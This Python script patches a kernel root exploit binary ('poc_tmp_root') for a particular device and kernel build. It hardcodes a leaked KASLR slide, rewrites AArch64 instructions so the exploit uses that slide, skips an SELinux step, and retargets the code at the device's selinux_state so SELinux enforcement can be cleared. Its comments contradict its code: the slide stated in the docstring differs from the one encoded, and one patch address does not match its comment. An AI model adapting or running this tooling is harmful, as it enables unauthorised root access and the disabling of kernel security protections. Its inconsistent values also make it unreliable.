#!/usr/bin/env python3
"""Patch the device's poc_tmp_root for the current PD2337 / 6.1.172 boot.

Only three changes:
  * leak_slide() returns the slide obtained read-only from raw ftrace
    (0x1d0c600000 for boot aecddbb7...).
  * modload_main() skips its XF6-specific SELinux plant; we separately clear
    selinux_state with an explicit --abs write.
  * pwn_main() x24 is retargeted from the XF6 selinux_state to the PD2337
    selinux_state link address (not required by the modload path).
"""
from __future__ import annotations
import struct, sys
from pathlib import Path
from elftools.elf.elffile import ELFFile

SLIDE = 0x2396A00000
SELINUX_LINK = 0xFFFFFFC00A5B1310

# AArch64 encodings
def movz(rd: int, imm16: int, hw: int = 0) -> int:
    return 0xD2800000 | ((hw & 3) << 21) | ((imm16 & 0xFFFF) << 5) | (rd & 31)

def movk(rd: int, imm16: int, hw: int = 0) -> int:
    return 0xF2800000 | ((hw & 3) << 21) | ((imm16 & 0xFFFF) << 5) | (rd & 31)

def movn(rd: int, imm16: int, hw: int = 0) -> int:
    return 0x92800000 | ((hw & 3) << 21) | ((imm16 & 0xFFFF) << 5) | (rd & 31)

RET = 0xD65F03C0
NOP = 0xD503201F
MOV_W0_1 = 0x52800020  # mov w0, #1

def va_to_off(elf: ELFFile, va: int) -> int:
    for seg in elf.iter_segments():
        if seg['p_type'] == 'PT_LOAD' and seg['p_vaddr'] <= va < seg['p_vaddr'] + seg['p_filesz']:
            return seg['p_offset'] + (va - seg['p_vaddr'])
    raise SystemExit(f'VA not mapped: {va:#x}')

def main() -> int:
    if len(sys.argv) != 3:
        print('usage: make_poc_patched.py <poc_tmp_root> <out>', file=sys.stderr)
        return 2
    src, dst = Path(sys.argv[1]), Path(sys.argv[2])
    data = bytearray(src.read_bytes())
    f = src.open('rb')
    elf = ELFFile(f)

    def patch_words(va: int, words: list[int]):
        off = va_to_off(elf, va)
        data[off:off + 4 * len(words)] = b''.join(struct.pack('<I', w) for w in words)

    # leak_slide(): movz x0,#0; movk x0,#0x6000,lsl16; movk x0,#0x1d0c,lsl32; ret
    patch_words(0x2456EC, [
        movz(0, 0),
        movk(0, 0x96A0, 1),
        movk(0, 0x0023, 2),
        RET,
    ])

    # modload_main(): skip the XF6 selinux_state plant.
    # 0x243abc: bl plant_once  ->  mov w0, #1
    patch_words(0x243ABC, [MOV_W0_1])

    # pwn_main(): x24 = 0xffffffc00a5b1310 (PD2337 selinux_state link)
    patch_words(0x24333C, [
        movn(24, 0),       # x24 = ~0 (top 16 = 0xffff)
        movk(24, 0x1310, 0),
        movk(24, 0x0A5B, 1),
        movk(24, 0xFFC0, 2),
    ])
    # The instruction at 0x24334c used to set w1 for show_child_uid; skipping
    # that debug print avoids a stale argument.
    patch_words(0x243354, [NOP])  # bl show_child_uid

    f.close()
    dst.write_bytes(data)
    print(f'wrote {dst} bytes={len(data)}')
    print(f'leak_slide returns {SLIDE:#x}')
    print(f'pwn_main selinux x24={SELINUX_LINK:#x}')
    return 0

if __name__ == '__main__':
    raise SystemExit(main())
